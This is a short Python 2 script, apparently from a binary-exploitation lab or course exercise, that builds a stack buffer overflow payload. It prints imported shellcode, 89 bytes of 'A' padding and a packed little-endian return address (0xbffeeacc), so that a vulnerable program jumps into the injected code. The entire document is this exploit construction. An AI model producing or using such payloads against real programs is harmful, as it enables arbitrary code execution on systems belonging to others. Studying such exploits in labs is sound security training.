from shellcode import shellcode
from struct import pack
addr = pack("<I", 0xbffeeacc)
print shellcode + 'A' * 89 + addr
